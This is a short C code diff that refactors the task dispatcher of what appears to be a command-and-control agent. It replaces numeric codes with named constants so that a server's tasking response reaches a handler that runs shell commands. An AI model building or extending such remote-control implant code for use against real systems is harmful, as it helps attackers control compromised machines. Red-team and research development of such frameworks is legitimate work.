@@ -12,7 +12,7 @@ BOOL handleGetTasking(PParser getTasking)
 		PBYTE taskBuffer = getBytes(getTasking, &sizeTask);
 		PParser taskParser = newParser(taskBuffer, sizeTask);
 
-		if (task == 0x54)
+		if (task == SHELL_CMD)
 		{
 			executeShell(taskParser);
 		}
@@ -23,17 +23,12 @@ BOOL handleGetTasking(PParser getTasking)
 }
 
 
-
-
-
-
-
 BOOL commandDispatch(PParser response)
 {
 	BYTE typeResponse = getByte(response);
-	if (typeResponse == 0)
-		return FALSE;
-	else if (typeResponse == 1)
+	if (typeResponse == GET_TASKING)
+		return handleGetTasking(response);
+	else if (typeResponse == POST_RESPONSE)
 		return FALSE;
 
 	return TRUE;
